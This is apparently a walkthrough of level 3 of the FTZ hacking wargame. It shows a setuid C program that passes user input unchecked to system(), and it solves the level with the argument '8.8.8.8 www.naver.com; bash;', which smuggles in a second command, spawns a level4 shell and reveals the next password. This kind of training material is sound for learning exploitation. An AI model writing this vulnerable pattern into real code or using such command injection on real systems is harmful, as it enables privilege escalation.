# Level3

This level's goal

- system('CMD') vulnerability

***

`[level3@ftz level3]$ cat hint`

다음 코드는 **autodig**의 소스이다.   
(This code is autodig's source)
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){

char cmd[100];

if( argc!=2 ){
    printf( "Auto Digger Version 0.9\n" );
    printf( "Usage : %s host\n", argv[0] );
    exit(0);
}

strcpy( cmd, "dig @" );
strcat( cmd, argv[1] );
strcat( cmd, " version.bind chaos txt");

system( cmd );
}
```

이를 이용하여 level4의 권한을 얻어라.   
(Get level4's privilege with using this)

more hints.

1) 동시에 여러 명령어를 사용하려면?   
(how to use several commands at the same itme?)

2) 문자열 형태로 명령어를 전달하려면?   
(how to pass the command of string?) 
***

```
[level3@ftz level3]$ find / -name autodig 2>/dev/null
/bin/autodig
[level3@ftz level3]$ find / -user level4 -perm -4000 2>/dev/null
/bin/autodig
[level3@ftz level3]$ ls -l /bin/autodig
-rwsr-x---    1 level4   level3      12194 Aug 19  2014 /bin/autodig
```

```
[level3@ftz level3]$ /bin/autodig "8.8.8.8 www.naver.com; bash;"
[level4@ftz level3]$ my-pass

Level4 Password is "suck my brain".
```

